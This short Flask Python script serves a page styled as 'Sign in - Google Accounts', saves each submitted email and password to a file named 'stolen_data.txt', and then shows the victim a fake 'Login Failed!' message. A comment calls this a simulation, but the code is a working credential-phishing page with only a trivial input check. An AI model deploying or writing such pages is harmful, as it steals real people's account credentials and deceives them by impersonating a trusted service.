from flask import Flask, request

app = Flask(__name__)

@app.route('/')
@app.route('/')
def login():
    return '''
    <html>
    <head>
        <title>Sign in - Google Accounts</title>
    </head>
    <body style="font-family: Arial; text-align:center; margin-top:100px;">
        <h2>Sign in</h2>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Email or phone" style="padding:10px; width:250px;"><br><br>
            <input type="password" name="password" placeholder="Enter your password" style="padding:10px; width:250px;"><br><br>
            <input type="submit" value="Next" style="padding:10px 20px;">
        </form>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def get_data():
    email = request.form['email']
    password = request.form['password']
    
    # Detection logic
    if "@" not in email or len(password) < 6:
        return "⚠ Suspicious Login Detected!"

    # Save data (simulation)
    with open("stolen_data.txt", "a") as f:
        f.write(f"{email} - {password}\n")
    
    return "Login Failed!"

app.run(debug=True)